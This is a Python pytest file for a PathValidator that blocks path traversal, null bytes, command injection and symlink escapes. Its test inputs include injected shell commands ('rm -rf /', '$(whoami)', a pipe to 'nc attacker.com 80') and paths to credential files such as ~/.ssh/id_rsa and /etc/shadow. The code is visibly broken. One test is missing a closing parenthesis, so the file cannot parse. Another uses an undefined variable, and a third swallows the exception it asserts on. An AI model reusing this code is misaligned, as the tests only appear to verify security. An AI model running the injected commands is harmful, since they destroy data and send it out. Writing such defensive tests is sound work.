"""
Unit tests for Path Validator - Path Traversal Protection

Tests security features of the PathValidator class to ensure it properly
blocks malicious path traversal attempts and only allows access to permitted directories.
"""

import pytest
import os
import tempfile
from pathlib import Path
import sys

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.security.path_validator import (
    PathValidator,
    InvalidPathError,
    create_default_validator,
    is_safe_path,
)


# ============================================================================
# Test Fixtures
# ============================================================================

@pytest.fixture
def temp_allowed_root():
    """Provide a temporary allowed root directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


@pytest.fixture
def validator(temp_allowed_root):
    """Provide a PathValidator with test allowed roots."""
    return PathValidator(allowed_roots=[temp_allowed_root])


@pytest.fixture
def multi_root_validator():
    """Provide a PathValidator with multiple allowed roots."""
    root1 = tempfile.mkdtemp()
    root2 = tempfile.mkdtemp()

    yield PathValidator(allowed_roots=[root1, root2])

    # Cleanup
    import shutil
    shutil.rmtree(root1, ignore_errors=True)
    shutil.rmtree(root2, ignore_errors=True)


# ============================================================================
# Test Path Validation
# ============================================================================

class TestPathValidator:
    """Test PathValidator class."""

    def test_validator_initialization(self, temp_allowed_root):
        """Test validator can be initialized."""
        validator = PathValidator(allowed_roots=[temp_allowed_root])
        assert validator is not None
        assert len(validator.get_allowed_roots()) == 1

    def test_validator_multiple_roots(self, multi_root_validator):
        """Test validator with multiple allowed roots."""
        roots = multi_root_validator.get_allowed_roots()
        assert len(roots) == 2

    def test_validator_invalid_root(self):
        """Test validator rejects non-existent roots."""
        with pytest.raises(ValueError, match="does not exist"):
            PathValidator(allowed_roots=["/nonexistent/path/that/does/not/exist"])

    def test_validate_safe_path(self, validator, temp_allowed_root):
        """Test validation of safe path within allowed root."""
        # Create a test file
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        # Should validate successfully
        result = validator.validate(str(test_file))
        assert result == test_file.resolve()

    def test_validate_subdirectory(self, validator, temp_allowed_root):
        """Test validation of subdirectory within allowed root."""
        # Create a subdirectory
        subdir = Path(temp_allowed_root) / "subdir" / "file.txt"
        subdir.parent.mkdir(parents=True)
        subdir.touch()

        # Should validate successfully
        result = validator.validate(str(subdir))
        assert result == subdir.resolve()

    def test_validate_current_directory(self, validator, temp_allowed_root):
        """Test validation of current directory (within allowed root)."""
        # Current directory should be valid
        result = validator.validate(".")
        assert isinstance(result, Path)


# ============================================================================
# Test Path Traversal Protection
# ============================================================================

class TestPathTraversalProtection:
    """Test path traversal attack prevention."""

    def test_double_dot_traversal(self, validator, temp_allowed_root):
        """Test that ../ path traversal is blocked."""
        malicious_path = str(Path(temp_allowed_root) / ".." / "etc" / "passwd")

        with pytest.raises(InvalidPathError, match="dangerous"):
            validator.validate(malicious_path)

    def test_double_dot_backslash_traversal(self, validator, temp_allowed_root):
        """Test that ..\\ path traversal is blocked."""
        malicious_path = str(Path(temp_allowed_root) / ".." / ".." / "windows" / "system32"

        with pytest.raises(InvalidPathError, match="dangerous"):
            validator.validate(malicious_path)

    def test_multiple_traversal_attempts(self, validator, temp_allowed_root):
        """Test multiple levels of path traversal."""
        paths = [
            str(Path(temp_allowed_root) / ".." / ".." / ".." / "etc"),
            str(Path(temp_allowed_root) / ".." / ".." / "etc" / "passwd"),
            str(Path(temp_allowed_root) / ".." / ".." / ".." / ".." / "etc"),
        ]

        for path in paths:
            with pytest.raises(InvalidPathError, match="dangerous|not within"):
                validator.validate(path)

    def test_traversal_with_allowed_prefix(self, validator, temp_allowed_root):
        """Test traversal attempt with legitimate prefix."""
        # Attacker tries to use legitimate directory name then traverse
        malicious_path = str(Path(temp_allowed_root) / "documents" / ".." / "etc")

        with pytest.raises(InvalidPathError, match="dangerous"):
            validator.validate(malicious_path)


# ============================================================================
# Test Input Validation
# ============================================================================

class TestInputValidation:
    """Test input validation features."""

    def test_null_byte_injection(self, validator, temp_allowed_root):
        """Test that null bytes are rejected."""
        malicious_paths = [
            str(Path(temp_allowed_root) / "test\x00.txt"),
            "test\x00directory",
            "\x00\x00\x00",
        ]

        for path in malicious_paths:
            with pytest.raises(InvalidPathError, match="Null bytes"):
                validator.validate(path)

    def test_excessive_length_path(self, validator, temp_allowed_root):
        """Test that extremely long paths are rejected."""
        # Create a path that exceeds MAX_PATH_LENGTH
        long_path = "A" * 2000
        malicious_path = str(Path(temp_allowed_root) / long_path)

        with pytest.raises(InvalidPathError, match="too long"):
            validator.validate(malicious_path)

    def test_command_injection_attempts(self, validator, temp_allowed_root):
        """Test command injection attempts are blocked."""
        malicious_paths = [
            str(Path(temp_allowed_root) / "file; rm -rf /"),
            str(Path(temp_allowed_root) / "$(whoami)"),
            str(Path(temp_allowed_root) / "`id`"),
            str(Path(temp_allowed_root) / "file | nc attacker.com 80"),
        ]

        for path in malicious_paths:
            with pytest.raises(InvalidPathError, match="dangerous"):
                validator.validate(path)


# ============================================================================
# Test Allowlist Enforcement
# ============================================================================

class TestAllowlistEnforcement:
    """Test that only allowed directories can be accessed."""

    def test_path_outside_allowed_roots(self, validator, temp_allowed_root):
        """Test that paths outside allowed roots are rejected."""
        external_paths = [
            "/etc/passwd",
            "/var/log/syslog",
            "C:\\Windows\\System32\\config\\SAM",
            os.path.expanduser("~/.ssh/id_rsa"),
        ]

        for path in external_paths:
            with pytest.raises(InvalidPathError, match="not within allowed roots"):
                validator.validate(path)

    def test_absolute_path_to_different_root(self, multi_root_validator):
        """Test that absolute path to different root is rejected."""
        # Get one of the allowed roots
        allowed_root = list(multi_root_validator.get_allowed_roots())[0]

        # Create a path in a different root
        external_root = tempfile.mkdtemp()
        try:
            malicious_path = str(Path(external_root) / "test.txt")
            Path(malicious_path).touch()

            with pytest.raises(InvalidPathError, match="not within allowed roots"):
                multi_root_validator.validate(malicious_path)
        finally:
            import shutil
            shutil.rmtree(external_root, ignore_errors=True)

    def test_allowed_root_subdirectory_success(self, validator, temp_allowed_root):
        """Test that subdirectory of allowed root is accepted."""
        subdir = Path(temp_allowed_root) / "documents" / "file.txt"
        subdir.parent.mkdir(parents=True)
        subdir.touch()

        result = validator.validate(str(subdir))
        assert result == subdir.resolve()


# ============================================================================
# Test System Directory Protection
# ============================================================================

class TestSystemDirectoryProtection:
    """Test protection of sensitive system directories."""

    @pytest.fixture
    def system_directories(self):
        """Return list of sensitive system directories."""
        return [
            "/etc",
            "/root",
            "/sys",
            "/proc",
            "C:\\Windows\\System32",
            "C:\\Windows\\System",
            os.path.expanduser("~/.ssh"),
            os.path.expanduser("~/.aws"),
        ]

    def test_system_directory_access_blocked(self, validator, system_directories):
        """Test that sensitive system directories are blocked."""
        for sys_dir in system_directories:
            if os.path.exists(sys_dir):
                with pytest.raises(InvalidPathError):
                    validator.validate(sys_dir)

    def test_system_directory_subdirectory_blocked(self, validator):
        """Test that subdirectories of system directories are blocked."""
        if os.name == 'posix':
            # Unix system directories
            system_dirs = ["/etc/passwd", "/etc/shadow"]
        else:
            # Windows system directories
            system_dirs = ["C:\\Windows\\System32\\config"]

        for sys_dir in system_dirs:
            if os.path.exists(sys_dir):
                with pytest.raises(InvalidPathError):
                    validator.validate(sys_dir)


# ============================================================================
# Test Validate and Sanitize
# ============================================================================

class TestValidateAndSanitize:
    """Test the validate_and_sanitize method."""

    def test_sanitize_returns_string(self, validator, temp_allowed_root):
        """Test that validate_and_sanitize returns string."""
        # Create a test file
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        result = validator.validate_and_sanitize(str(test_file))
        assert isinstance(result, str)
        assert os.path.isabs(result)

    def test_sanitize_returns_normalized_path(self, validator, temp_allowed_root):
        """Test that validate_and_sanitize returns normalized absolute path."""
        # Create a test file with relative path
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        # Use relative path
        result = validator.validate_and_sanitize("test.txt")
        assert os.path.isabs(result)
        assert result.endswith("test.txt")


# ============================================================================
# Test Safe Subpath Checking
# ============================================================================

class TestSafeSubpath:
    """Test the is_safe_subpath helper method."""

    def test_safe_subpath_true(self, validator, temp_allowed_root):
        """Test is_safe_subpath returns True for safe subpath."""
        parent = Path(temp_allowed_root)
        child = Path(temp_allowed_root) / "subdir" / "file.txt"

        assert validator.is_safe_subpath(parent, child)

    def test_safe_subpath_false(self, validator, temp_allowed_root):
        """Test is_safe_subpath returns False for unsafe subpath."""
        parent = Path(temp_allowed_root)
        child = Path(temp_allowed_root) / ".." / "etc"

        assert not validator.is_safe_subpath(parent, child)


# ============================================================================
# Test Default Validator
# ============================================================================

class TestDefaultValidator:
    """Test the default validator creation."""

    def test_default_validator_uses_home(self):
        """Test that default validator uses home directory."""
        validator = create_default_validator()
        roots = validator.get_allowed_roots()

        assert len(roots) == 1
        home_dir = os.path.expanduser("~")
        assert any(str(root) == home_dir for root in roots)

    def test_default_validates_home_subdirectory(self):
        """Test that default validator validates home subdirectories."""
        validator = create_default_validator()

        # Create a temp directory in home
        home_dir = os.path.expanduser("~")
        test_dir = Path(home_dir) / "test_disk_intelligence_temp"
        test_dir.mkdir(exist_ok=True)

        try:
            # Should validate successfully
            result = validator.validate(str(test_dir))
            assert result == test_dir.resolve()
        finally:
            # Cleanup
            test_dir.rmdir()


# ============================================================================
# Test Convenience Functions
# ============================================================================

class TestConvenienceFunctions:
    """Test convenience functions."""

    def test_is_safe_path_with_valid_path(self, temp_allowed_root):
        """Test is_safe_path returns True for valid path."""
        # Create a test file
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        assert is_safe_path(str(test_file))

    def test_is_safe_path_with_invalid_path(self):
        """Test is_safe_path returns False for invalid path."""
        assert not is_safe_path("../../../etc/passwd")
        assert not is_safe_path("/nonexistent/path/that/does/not/exist")

    def test_is_safe_path_with_custom_validator(self, temp_allowed_root):
        """Test is_safe_path with custom validator."""
        custom_validator = PathValidator(allowed_roots=[temp_allowed_root])

        # Create a test file
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        assert is_safe_path(str(test_file), validator=custom_validator)

    def test_is_safe_path_with_traversal_blocked(self, temp_allowed_root):
        """Test is_safe_path blocks traversal with custom validator."""
        custom_validator = PathValidator(allowed_roots=[temp_allowed_root])

        # Path traversal should be blocked
        assert not is_safe_path(str(Path(temp_allowed_root) / ".." / "etc"), validator=custom_validator)


# ============================================================================
# Edge Cases
# ============================================================================

class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_string(self, validator):
        """Test empty string is rejected."""
        with pytest.raises(InvalidPathError, match="Invalid path|does not exist"):
            validator.validate("")

    def test_relative_path_without_allowed_root(self):
        """Test relative path without explicit allowed root fails."""
        validator = PathValidator(allowed_roots=["/tmp"])

        # Current directory is not in allowed roots
        with pytest.raises(InvalidPathError):
            validator.validate("relative_path.txt")

    def test_symlink_to_allowed_directory(self, validator, temp_allowed_root):
        """Test that symlink within allowed root is valid."""
        # Create a symlink
        test_file = Path(temp_allowed_root) / "original.txt"
        test_file.touch()

        link_path = Path(temp_allowed_root) / "link.txt"
        try:
            link_path.symlink_to(test_file)

            # Should validate successfully
            result = validator.validate(str(link_path))
            assert result == link_path.resolve()
        except OSError:
            # Symlinks may not be supported on this system
            pytest.skip("Symlinks not supported")

    def test_symlink_outside_allowed_root(self, validator, temp_allowed_root):
        """Test that symlink outside allowed root is blocked."""
        # Create a file outside allowed roots
        external_file = tempfile.NamedTemporaryFile(delete=False)
        external_path = Path(external_file.name)

        try:
            # Create symlink inside allowed root pointing outside
            link_path = Path(temp_allowed_root) / "external_link.txt"

            try:
                link_path.symlink_to(external_path)

                # Should be blocked (points outside allowed root)
                with pytest.raises(InvalidPathError):
                    validator.validate(str(link_path))
            except OSError:
                pytest.skip("Symlinks not supported")
        finally:
            # Cleanup
            external_path.unlink()
            if link_path.exists():
                link_path.unlink()

    def test_nonexistent_path(self, validator, temp_allowed_root):
        """Test that non-existent path is rejected."""
        nonexistent = str(Path(temp_allowed_root) / "nonexistent_file.txt")

        with pytest.raises(InvalidPathError, match="does not exist"):
            validator.validate(nonexistent_path)


# ============================================================================
# Performance Tests
# ============================================================================

class TestPerformance:
    """Test performance of path validation."""

    def test_validation_performance(self, validator, temp_allowed_root, benchmark):
        """Test that validation is fast enough (< 1ms)."""
        # Create a valid path
        test_file = Path(temp_allowed_root) / "test.txt"
        test_file.touch()

        # Benchmark validation
        def validate_path():
            validator.validate(str(test_file))

        # Run multiple iterations
        iterations = 1000
        import time
        start = time.perf_counter()
        for _ in range(iterations):
            validate_path()
        end = time.perf_counter()

        avg_time = (end - start) / iterations

        # Should be very fast (< 1ms per validation)
        assert avg_time < 0.001, f"Validation too slow: {avg_time:.4f}s per validation"


# ============================================================================
# Test Error Messages
# ============================================================================

class TestErrorMessages:
    """Test that error messages are helpful and don't leak information."""

    def test_error_message_does_not_leak_path(self, validator):
        """Test that error messages don't expose actual paths."""
        sensitive_path = "/home/john/.ssh/id_rsa"

        with pytest.raises(InvalidPathError) as exc_info:
            try:
                validator.validate(sensitive_path)
            except:
                pass  # Ignore other errors

        # Error message should not contain the sensitive path
        error_msg = str(exc_info.value).lower()
        assert "john" not in error_msg
        assert ".ssh" not in error_msg

    def test_error_message_informative(self, validator):
        """Test that error messages are informative."""
        with pytest.raises(InvalidPathError) as exc_info:
            validator.validate("../../../etc/passwd")

        error_msg = str(exc_info.value)
        # Should mention the issue
        assert "dangerous" in error_msg.lower() or "not within" in error_msg.lower()
